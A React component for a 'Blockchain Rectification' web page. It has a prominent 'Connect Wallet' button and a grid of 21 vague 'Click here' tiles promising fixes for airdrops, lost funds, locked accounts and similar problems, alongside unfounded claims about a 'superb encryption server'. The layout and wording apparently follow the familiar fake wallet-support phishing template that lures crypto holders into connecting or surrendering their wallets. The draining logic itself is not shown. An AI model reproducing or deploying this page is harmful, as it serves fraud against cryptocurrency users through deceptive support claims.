import { useState } from "react";
import { Zap, Loader2 } from "lucide-react";
import { useWeb3 } from "../hooks/useWeb3";
import { useToast } from "@/hooks/use-toast";
import WalletSelectorModal from "./WalletSelectorModal";
import WalletHelpModal from "./WalletHelpModal";

export default function BonilaSection() {
  const {
    walletConnected,
    connecting,
    connectWallet,
  } = useWeb3();

  const { toast } = useToast();
  const [showSelector, setShowSelector] = useState(false);
  const [showHelp, setShowHelp] = useState(false);

  const handleOpenConnect = () => {
    setShowSelector(true);
  };

  const handleConnectInjected = async () => {
    setShowSelector(false);
    if (!window.ethereum) {
      setShowHelp(true);
      return;
    }
    await connectWallet('injected');
  };

  const handleConnectWalletConnect = async () => {
    setShowSelector(false);
    await connectWallet('walletconnect');
  };
  const features = [
    { title: "Migration", description: "Click here for migration" },
    { title: "Claim Token", description: "Click here to claim assets" },
    { title: "Swap", description: "Click here for assets swapping" },
    { title: "Slippage", description: "Click here for slippage related error." },
    { title: "Exchange", description: "Click here for exchange related issues" },
    { title: "Connect to Dapps", description: "Click here for error while connecting to dapps" },
    { title: "NFT Rarity and traits", description: "Click here for NFT related issues." },
    { title: "Whitelist", description: "Click here for whitelist related issues." },
    { title: "Login", description: "Click here for wallet login issue." },
    { title: "Transaction", description: "Click here for transaction related issues." },
    { title: "Cross Transfer", description: "Click here for cross bridge issues." },
    { title: "Staking", description: "Click here for staking related issues." },
    { title: "Buy Coins/Tokens", description: "To trade, your account must be marked as a trusted payment source." },
    { title: "Missing/Irregular balance", description: "Click here to recover lost/missing funds." },
    { title: "Wallet glitch / wallet error", description: "Click here if you have problem with your trading wallet." },
    { title: "Transaction Delay", description: "Click here for any issues related to transaction delay." },
    { title: "Claim Airdrop", description: "Click here for airdrop related issues." },
    { title: "NFTs", description: "Click here for NFTs minting/transfer related issues." },
    { title: "Locked Account", description: "Click here for issues related to account lock." },
    { title: "Presale", description: "Click here to buy/claim presale token" },
    { title: "Reward", description: "Click here for reward related issues." },
  ];

  return (
    <div id="bonita" className="min-h-screen bg-gradient-to-b from-background via-background to-accent/5 py-16 px-6">
      {/* Wallet Modals */}
      <WalletSelectorModal
        isOpen={showSelector}
        onClose={() => setShowSelector(false)}
        onConnectInjected={handleConnectInjected}
        onConnectWalletConnect={handleConnectWalletConnect}
        connecting={connecting}
      />

      <WalletHelpModal
        isOpen={showHelp}
        onClose={() => setShowHelp(false)}
      />

      {/* Hero Section */}
      <div className="max-w-7xl mx-auto mb-16">
        <div className="grid lg:grid-cols-2 gap-12 items-center">
          {/* Text Content */}
          <div className="space-y-6">
            <h1 className="text-5xl lg:text-6xl font-black tracking-tight text-foreground leading-tight">
              Decentralized to{" "}
              <span className="bg-gradient-to-r from-blue-500 via-purple-500 to-pink-500 bg-clip-text text-transparent">
                blockchains
              </span>
              <br />
              Chain Protocol
            </h1>
            
            <p className="text-lg text-muted-foreground leading-relaxed">
              Chain provides industry-leading Web3 and Blockchain safe protocol and process encrypted by a superb encryption server. Your information never leaves our server or be visible to anyone.
            </p>

            <button
              className="premium-button w-full h-14 text-xl font-black"
              onClick={handleOpenConnect}
              disabled={connecting}
            >
              {connecting ? (
                <div className="flex items-center gap-2">
                  <Loader2 size={20} className="animate-spin" />
                  <span>Connecting...</span>
                </div>
              ) : (
                <>
                  <Zap size={20} />
                  <span>Connect Wallet</span>
                </>
              )}
            </button>
          </div>

          {/* ETH Shape */}
          <div className="hidden lg:flex justify-center items-center">
            <div className="relative w-80 h-80">
              {/* Top Triangle */}
              <div className="absolute left-1/2 top-0 transform -translate-x-1/2">
                <div className="w-0 h-0 border-l-24 border-r-24 border-b-48 border-l-transparent border-r-transparent border-b-cyan-400"
                  style={{
                    borderLeft: '90px solid transparent',
                    borderRight: '90px solid transparent',
                    borderBottom: '170px solid #67d9ff',
                    filter: 'drop-shadow(0 0 20px #4f8dff)'
                  }}
                />
              </div>

              {/* Bottom Triangle */}
              <div className="absolute left-1/2 bottom-0 transform -translate-x-1/2">
                <div className="w-0 h-0 border-l-24 border-r-24 border-t-48 border-l-transparent border-r-transparent border-t-blue-600"
                  style={{
                    borderLeft: '90px solid transparent',
                    borderRight: '90px solid transparent',
                    borderTop: '170px solid #3f6cff',
                    filter: 'drop-shadow(0 0 20px #7a5cff)'
                  }}
                />
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Services Grid */}
      <div className="max-w-7xl mx-auto">
        <h2 className="text-4xl lg:text-5xl font-black text-center mb-16 text-foreground">
          Make Your Selection Below
        </h2>

        <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
          {features.map((feature, index) => (
            <div
              key={index}
              className="group bg-card border border-border/50 rounded-2xl p-8 cursor-pointer transition-all duration-300 hover:shadow-xl hover:shadow-primary/20 hover:border-primary/50 hover:bg-accent/10 transform hover:-translate-y-1"
            >
              <h3 className="text-xl font-black text-foreground mb-3 group-hover:text-primary transition-colors">
                {feature.title}
              </h3>
              <p className="text-muted-foreground leading-relaxed">
                {feature.description}
              </p>
            </div>
          ))}
        </div>
      </div>

      {/* Footer */}
      <div className="max-w-7xl mx-auto mt-24 pt-12 border-t border-border/50">
        <div className="flex flex-col md:flex-row justify-between items-center gap-6">
          <p className="text-muted-foreground font-semibold">© 2024. Blockchain Rectification.</p>
          <div className="flex gap-8">
            <a href="#" className="text-muted-foreground hover:text-foreground transition-colors font-semibold">
              Privacy Policy
            </a>
            <a href="#" className="text-muted-foreground hover:text-foreground transition-colors font-semibold">
              Terms & Conditions
            </a>
          </div>
        </div>
      </div>
    </div>
  );
}
